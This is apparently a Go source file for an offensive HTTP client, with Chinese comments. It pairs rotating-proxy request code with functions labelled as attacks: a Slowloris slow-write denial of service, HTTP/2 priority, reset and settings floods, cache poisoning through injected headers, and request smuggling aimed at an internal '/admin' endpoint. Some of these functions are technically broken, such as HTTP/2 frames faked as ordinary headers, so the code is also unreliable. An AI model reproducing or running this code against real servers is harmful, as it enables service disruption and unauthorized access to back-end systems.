package http

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"golang.org/x/net/http2"
)

// ClientOptions HTTP客户端配置选项
type ClientOptions struct {
	// 基础配置
	Timeout         time.Duration
	KeepAlive       bool
	MaxConns        int
	MaxConnsPerHost int
	NoCompression   bool
	Debug           bool // 是否启用调试日志

	// TLS配置
	TLSConfig     *tls.Config
	SkipVerify    bool
	TLSMinVersion uint16
	TLSMaxVersion uint16

	// HTTP2配置
	ForceHTTP2    bool
	HTTP2Settings []http2.Setting

	// 代理配置
	Proxy     string
	ProxyAuth string
	ProxyURL  string // 代理URL

	// 其他配置
	FollowRedirects bool
	RetryTimes      int
	RetryDelay      time.Duration

	// HTTP/2攻击相关配置
	HTTP2PriorityFrames bool
	HTTP2StreamWeight   uint8
	HTTP2Dependencies   []uint32

	// 慢速攻击相关配置
	SlowReadRate   int
	SlowWriteRate  int
	SlowHeaderRate int

	// 请求走私相关配置
	AllowRequestSmuggling bool
	SmuggleMethod         string

	// 缓存攻击相关配置
	CachePoisonHeaders map[string]string
	VaryByHeaders      []string
}

// Client HTTP客户端
type Client struct {
	*http.Client
	options     ClientOptions
	transport   *http.Transport
	h2transport *http2.Transport
	proxyFunc   func() (*url.URL, error) // 动态代理选择函数
}

// proxyTransport wraps http.Transport to add request tracking
type proxyTransport struct {
	transport *http.Transport
	proxyFunc func() (*url.URL, error)
	debug     bool
	attempt   int
}

func (pt *proxyTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	// 获取新的代理
	proxyURL, err := pt.proxyFunc()
	if err != nil {
		return nil, fmt.Errorf("failed to get proxy: %v", err)
	}

	// 更新transport的代理设置
	pt.transport.Proxy = http.ProxyURL(proxyURL)

	if pt.debug {
		fmt.Printf("\n[DEBUG] ===================== 请求详情 =====================\n")
		fmt.Printf("[DEBUG] 请求信息:\n")
		fmt.Printf("  请求方法: %s\n", req.Method)
		fmt.Printf("  目标URL: %s\n", req.URL.String())
		fmt.Printf("  Host: %s\n", req.Host)
		fmt.Printf("  User-Agent: %s\n", req.Header.Get("User-Agent"))
		fmt.Printf("  X-Forwarded-For: %s\n", req.Header.Get("X-Forwarded-For"))
		fmt.Printf("  X-Real-IP: %s\n", req.Header.Get("X-Real-IP"))

		fmt.Printf("\n[DEBUG] 代理信息:\n")
		fmt.Printf("  代理服务器: %s\n", proxyURL.String())
		fmt.Printf("  重试次数: %d/3\n", pt.attempt)

		fmt.Printf("\n[DEBUG] 请求头:\n")
		for key, values := range req.Header {
			fmt.Printf("  %s: %v\n", key, values)
		}
		fmt.Printf("\n[DEBUG] ====================================================\n")
	}

	start := time.Now()
	resp, err := pt.transport.RoundTrip(req)
	duration := time.Since(start)

	if pt.debug {
		fmt.Printf("\n[DEBUG] ===================== 响应详情 =====================\n")
		if err != nil {
			fmt.Printf("[DEBUG] 请求失败:\n")
			fmt.Printf("  目标URL: %s\n", req.URL.String())
			fmt.Printf("  使用代理: %s\n", proxyURL.String())
			fmt.Printf("  错误信息: %v\n", err)
			fmt.Printf("  请求耗时: %v\n", duration)
		} else {
			fmt.Printf("[DEBUG] 请求成功:\n")
			fmt.Printf("  目标URL: %s\n", req.URL.String())
			fmt.Printf("  使用代理: %s\n", proxyURL.String())
			fmt.Printf("  响应状态: %s\n", resp.Status)
			fmt.Printf("  请求耗时: %v\n", duration)
			fmt.Printf("  Content-Length: %d\n", resp.ContentLength)

			// 获取并打印响应的真实IP
			remoteAddr := ""
			if resp.Header.Get("X-Real-IP") != "" {
				remoteAddr = resp.Header.Get("X-Real-IP")
			} else if resp.Header.Get("X-Forwarded-For") != "" {
				// X-Forwarded-For可能包含多个IP，取第一个
				ips := strings.Split(resp.Header.Get("X-Forwarded-For"), ",")
				if len(ips) > 0 {
					remoteAddr = strings.TrimSpace(ips[0])
				}
			}
			if remoteAddr != "" {
				fmt.Printf("  请求来源IP: %s\n", remoteAddr)
			}

			fmt.Printf("\n[DEBUG] 响应头:\n")
			for key, values := range resp.Header {
				fmt.Printf("  %s: %v\n", key, values)
			}
		}
		fmt.Printf("\n[DEBUG] ====================================================\n\n")
	}

	return resp, err
}

// NewClient 创建新的HTTP客户端
func NewClient(options ClientOptions) (*Client, error) {
	// 创建基础传输配置
	transport := &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:          options.MaxConns,
		MaxIdleConnsPerHost:   options.MaxConnsPerHost,
		MaxConnsPerHost:       options.MaxConnsPerHost,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		DisableCompression:    options.NoCompression,
		DisableKeepAlives:     !options.KeepAlive,
	}

	// 配置TLS
	if options.TLSConfig != nil {
		transport.TLSClientConfig = options.TLSConfig
	} else if options.SkipVerify {
		transport.TLSClientConfig = &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         options.TLSMinVersion,
			MaxVersion:         options.TLSMaxVersion,
		}
	}

	client := &Client{
		options:   options,
		transport: transport,
		Client: &http.Client{
			Transport: transport,
			Timeout:   options.Timeout,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}

	// 如果设置了代理，配置代理
	if options.ProxyURL != "" {
		proxyURL, err := url.Parse(options.ProxyURL)
		if err != nil {
			return nil, fmt.Errorf("invalid proxy URL: %v", err)
		}

		// 设置代理函数
		client.proxyFunc = func() (*url.URL, error) {
			return proxyURL, nil
		}

		// 更新transport的代理设置
		transport.Proxy = func(req *http.Request) (*url.URL, error) {
			if client.proxyFunc != nil {
				return client.proxyFunc()
			}
			return nil, nil
		}
	}

	// 配置HTTP2
	if options.ForceHTTP2 {
		h2transport := &http2.Transport{
			TLSClientConfig: transport.TLSClientConfig,
			DialTLSContext: func(ctx context.Context, network, addr string, cfg *tls.Config) (net.Conn, error) {
				if transport.Proxy != nil {
					proxyURL, err := transport.Proxy(&http.Request{
						URL: &url.URL{
							Scheme: "https",
							Host:   addr,
						},
					})
					if err != nil {
						return nil, err
					}
					if proxyURL != nil {
						dialer := &net.Dialer{}
						conn, err := dialer.DialContext(ctx, network, proxyURL.Host)
						if err != nil {
							return nil, err
						}
						tlsConn := tls.Client(conn, cfg)
						if err := tlsConn.HandshakeContext(ctx); err != nil {
							conn.Close()
							return nil, err
						}
						return tlsConn, nil
					}
				}
				dialer := &net.Dialer{}
				conn, err := dialer.DialContext(ctx, network, addr)
				if err != nil {
					return nil, err
				}
				tlsConn := tls.Client(conn, cfg)
				if err := tlsConn.HandshakeContext(ctx); err != nil {
					conn.Close()
					return nil, err
				}
				return tlsConn, nil
			},
		}
		client.h2transport = h2transport

		// 启用HTTP/2
		if err := http2.ConfigureTransport(transport); err != nil {
			return nil, fmt.Errorf("failed to configure HTTP/2: %v", err)
		}
	} else {
		// 完全禁用HTTP/2
		transport.TLSNextProto = make(map[string]func(authority string, c *tls.Conn) http.RoundTripper)
	}

	return client, nil
}

// Request HTTP请求配置
type Request struct {
	Method      string
	URL         string
	Headers     map[string]string
	Cookies     map[string]string
	Body        []byte
	QueryParams map[string]string
}

// Do 发送HTTP请求
func (c *Client) Do(ctx context.Context, req Request) (*http.Response, error) {
	// 构建请求URL
	reqURL, err := url.Parse(req.URL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %v", err)
	}

	// 添加查询参数
	if len(req.QueryParams) > 0 {
		q := reqURL.Query()
		for k, v := range req.QueryParams {
			q.Add(k, v)
		}
		reqURL.RawQuery = q.Encode()
	}

	// 创建HTTP请求
	httpReq, err := http.NewRequestWithContext(ctx, req.Method, reqURL.String(), bytes.NewReader(req.Body))
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}

	// 添加请求头
	for k, v := range req.Headers {
		httpReq.Header.Set(k, v)
	}

	// 添加Cookie
	for k, v := range req.Cookies {
		httpReq.AddCookie(&http.Cookie{
			Name:  k,
			Value: v,
		})
	}

	// 发送请求
	var resp *http.Response
	var lastErr error
	for i := 0; i <= c.options.RetryTimes; i++ {
		// 如果设置了代理函数，则每次请求前获取新的代理
		if c.proxyFunc != nil {
			// 获取新的代理
			proxyURL, err := c.proxyFunc()
			if err != nil {
				return nil, fmt.Errorf("failed to get proxy URL: %v", err)
			}

			// 直接更新transport的代理设置
			c.transport.Proxy = http.ProxyURL(proxyURL)

			// 创建带调试功能的代理传输层
			if c.options.Debug {
				debugTransport := &proxyTransport{
					transport: c.transport, // 使用客户端的transport
					proxyFunc: c.proxyFunc,
					debug:     c.options.Debug,
					attempt:   i + 1,
				}

				// 临时替换传输层
				c.Client.Transport = debugTransport
			} else {
				// 如果不需要调试，直接使用更新了代理的transport
				c.Client.Transport = c.transport
			}
		}

		resp, err = c.Client.Do(httpReq)
		if err == nil {
			return resp, nil
		}
		lastErr = err
		if i < c.options.RetryTimes {
			time.Sleep(c.options.RetryDelay)
			continue
		}
	}

	return nil, fmt.Errorf("request failed after %d retries: %v", c.options.RetryTimes, lastErr)
}

// DoWithH2 使用HTTP/2发送请求
func (c *Client) DoWithH2(ctx context.Context, req Request) (*http.Response, error) {
	if c.h2transport == nil {
		return nil, fmt.Errorf("HTTP/2 transport not configured")
	}

	// 创建HTTP/2请求
	httpReq, err := http.NewRequestWithContext(ctx, req.Method, req.URL, bytes.NewReader(req.Body))
	if err != nil {
		return nil, fmt.Errorf("failed to create HTTP/2 request: %v", err)
	}

	// 添加请求头
	for k, v := range req.Headers {
		httpReq.Header.Set(k, v)
	}

	// 发送HTTP/2请求
	return c.h2transport.RoundTrip(httpReq)
}

// Close 关闭客户端连接
func (c *Client) Close() {
	c.transport.CloseIdleConnections()
}

// GetTransport 获取传输层配置
func (c *Client) GetTransport() http.RoundTripper {
	return c.transport
}

// SetProxy 设置代理
func (c *Client) SetProxy(proxyURL string) error {
	if proxyURL == "" {
		c.transport.Proxy = nil
		return nil
	}

	proxy, err := url.Parse(proxyURL)
	if err != nil {
		return fmt.Errorf("invalid proxy URL: %v", err)
	}

	c.transport.Proxy = http.ProxyURL(proxy)
	return nil
}

// SetTLSConfig 设置TLS配置
func (c *Client) SetTLSConfig(config *tls.Config) {
	c.transport.TLSClientConfig = config
}

// SetTimeout 设置超时时间
func (c *Client) SetTimeout(timeout time.Duration) {
	c.Client.Timeout = timeout
}

// SetKeepAlive 设置长连接
func (c *Client) SetKeepAlive(keepalive bool) {
	c.transport.DisableKeepAlives = !keepalive
}

// SetMaxConns 设置最大连接数
func (c *Client) SetMaxConns(maxConns int) {
	c.transport.MaxIdleConns = maxConns
	c.transport.MaxConnsPerHost = maxConns
}

// GetResponseBody 读取响应体
func GetResponseBody(resp *http.Response) ([]byte, error) {
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

// DoSlowLoris 执行慢速攻击
func (c *Client) DoSlowLoris(ctx context.Context, req Request) error {
	httpReq, err := c.prepareRequest(ctx, req)
	if err != nil {
		return err
	}

	// 设置特殊头部保持连接存活
	httpReq.Header.Set("Connection", "keep-alive")
	httpReq.Header.Set("Keep-Alive", "300")

	// 创建自定义传输以控制写入速率
	transport := &http.Transport{
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			conn, err := net.Dial(network, addr)
			if err != nil {
				return nil, err
			}
			return &slowConn{
				Conn:      conn,
				writeRate: c.options.SlowWriteRate,
			}, nil
		},
	}

	client := &http.Client{Transport: transport}
	return c.executeRequest(ctx, client, httpReq)
}

// DoHTTP2Priority 执行HTTP/2优先级攻击
func (c *Client) DoHTTP2Priority(ctx context.Context, req Request) error {
	httpReq, err := c.prepareRequest(ctx, req)
	if err != nil {
		return err
	}

	// 添加优先级帧
	for i := 0; i < len(c.options.HTTP2Dependencies); i++ {
		httpReq.Header.Add(fmt.Sprintf("Priority-%d", i),
			fmt.Sprintf("%d;w=%d", c.options.HTTP2Dependencies[i], c.options.HTTP2StreamWeight))
	}

	return c.executeRequest(ctx, c.Client, httpReq)
}

// DoHTTP2Reset 执行HTTP/2 RST攻击
func (c *Client) DoHTTP2Reset(ctx context.Context, req Request) error {
	httpReq, err := c.prepareRequest(ctx, req)
	if err != nil {
		return err
	}

	// 发送请求后立即重置连接
	go func() {
		time.Sleep(10 * time.Millisecond)
		c.transport.CloseIdleConnections()
	}()

	return c.executeRequest(ctx, c.Client, httpReq)
}

// DoHTTP2Settings 执行HTTP/2设置帧攻击
func (c *Client) DoHTTP2Settings(ctx context.Context, req Request) error {
	httpReq, err := c.prepareRequest(ctx, req)
	if err != nil {
		return err
	}

	// 添加设置帧
	for i, setting := range c.options.HTTP2Settings {
		httpReq.Header.Add(fmt.Sprintf("Settings-%d", i),
			fmt.Sprintf("%d:%d", setting.ID, setting.Val))
	}

	return c.executeRequest(ctx, c.Client, httpReq)
}

// DoCachePoison 执行缓存投毒攻击
func (c *Client) DoCachePoison(ctx context.Context, req Request) error {
	httpReq, err := c.prepareRequest(ctx, req)
	if err != nil {
		return err
	}

	// 添加缓存投毒头部
	for k, v := range c.options.CachePoisonHeaders {
		httpReq.Header.Set(k, v)
	}

	// 添加Vary头部
	for _, h := range c.options.VaryByHeaders {
		httpReq.Header.Add("Vary", h)
	}

	return c.executeRequest(ctx, c.Client, httpReq)
}

// DoRequestSmuggling 执行请求走私攻击
func (c *Client) DoRequestSmuggling(ctx context.Context, req Request) error {
	if !c.options.AllowRequestSmuggling {
		return fmt.Errorf("request smuggling is not allowed")
	}

	httpReq, err := c.prepareRequest(ctx, req)
	if err != nil {
		return err
	}

	// 构造走私请求
	smuggleBody := fmt.Sprintf("%s /admin HTTP/1.1\r\nHost: internal-server\r\n\r\n",
		c.options.SmuggleMethod)
	httpReq.Body = io.NopCloser(strings.NewReader(smuggleBody))

	// 添加不一致的Content-Length头部
	httpReq.Header.Set("Content-Length", fmt.Sprintf("%d", len(smuggleBody)))
	httpReq.Header.Set("Transfer-Encoding", "chunked")

	return c.executeRequest(ctx, c.Client, httpReq)
}

// 辅助类型和方法

// slowConn 慢速连接包装器
type slowConn struct {
	net.Conn
	writeRate int
}

func (c *slowConn) Write(b []byte) (n int, err error) {
	if c.writeRate <= 0 {
		return c.Conn.Write(b)
	}

	written := 0
	for written < len(b) {
		chunk := 1
		if written+chunk > len(b) {
			chunk = len(b) - written
		}
		n, err := c.Conn.Write(b[written : written+chunk])
		if err != nil {
			return written + n, err
		}
		written += n
		time.Sleep(time.Second / time.Duration(c.writeRate))
	}
	return written, nil
}

// prepareRequest 准备HTTP请求
func (c *Client) prepareRequest(ctx context.Context, req Request) (*http.Request, error) {
	// 构建请求URL
	reqURL, err := url.Parse(req.URL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %v", err)
	}

	// 添加查询参数
	if len(req.QueryParams) > 0 {
		q := reqURL.Query()
		for k, v := range req.QueryParams {
			q.Add(k, v)
		}
		reqURL.RawQuery = q.Encode()
	}

	// 创建HTTP请求
	httpReq, err := http.NewRequestWithContext(ctx, req.Method, reqURL.String(), bytes.NewReader(req.Body))
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}

	// 添加请求头
	for k, v := range req.Headers {
		httpReq.Header.Set(k, v)
	}

	// 添加Cookie
	for k, v := range req.Cookies {
		httpReq.AddCookie(&http.Cookie{
			Name:  k,
			Value: v,
		})
	}

	return httpReq, nil
}

// executeRequest 执行HTTP请求
func (c *Client) executeRequest(ctx context.Context, client *http.Client, req *http.Request) error {
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// SetProxyFunc 设置动态代理选择函数
func (c *Client) SetProxyFunc(proxyFunc func() (*url.URL, error)) {
	c.proxyFunc = proxyFunc
	c.transport.Proxy = func(req *http.Request) (*url.URL, error) {
		if c.proxyFunc != nil {
			return c.proxyFunc()
		}
		return nil, nil
	}
}

// SetCustomTransport 设置自定义Transport
func (c *Client) SetCustomTransport(transport http.RoundTripper) {
	if transport != nil {
		// 保存原始配置
		c.Client.Transport = transport
	}
}
